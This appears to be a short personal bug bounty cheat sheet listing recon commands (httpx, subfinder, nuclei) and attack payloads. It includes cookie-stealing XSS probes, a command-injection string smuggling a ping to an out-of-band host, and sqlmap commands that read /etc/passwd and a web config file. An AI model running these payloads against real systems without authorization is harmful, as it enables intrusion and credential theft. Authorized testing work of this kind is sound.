# Bug Bounty Personal Tips

## Recon 

## HTTPX 

`/home/kali/go/bin/httpx -l FC -ss -srd /media/sf_Test/FC/screenshots/ --title --status-code -o /media/sf_Test/FC_httpx.txt `

`/home/kali/go/bin/httpx -l FC -proxy http://192.168.0.131:1337 `

## XSS
```  : /"><script>alert(document.cookie)</script> ```

``` %27)+O+%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E ```

## SSRF 
``` galletita ; ping -c 1 burp.oastify.com ```

## SQLMAP
```
sqlmap -u "http://X/dashboard/dashboard.php" \
--data "search=34" \
--cookie "PHPSESSID=X" \
--batch --random-agent \
--file-read="/etc/passwd"
```

```
sqlmap -u "http://X/dashboard/dashboard.php" \
--data "search=34" \
--cookie "PHPSESSID=X" \
--batch --random-agent \
--file-read="/var/www/html/config.php"
```

### OTHERS
``` assetfinder X.com | tee -a /tmp/X.txt```

``` cat /tmp/X.txt | httprobe -p http:81 -p https:8443 -p http:8000 -p http:8001 -p http:8181 -t 40000 | tee -a /tmp/X.txt ```

```  nuclei -l p.txt -t cves/ -t default-credentials/ -o priceline_results.txt -p http://192.168.100.2:1337```

``` subfinder -d X | /home/kali/go/bin/httpx -u -status-code -title -tech-detect -follow-redirects -timeout 5 ```

``` site:*.com.ar "bug bounty" OR "vulnerability disclosure" OR "security policy" ```

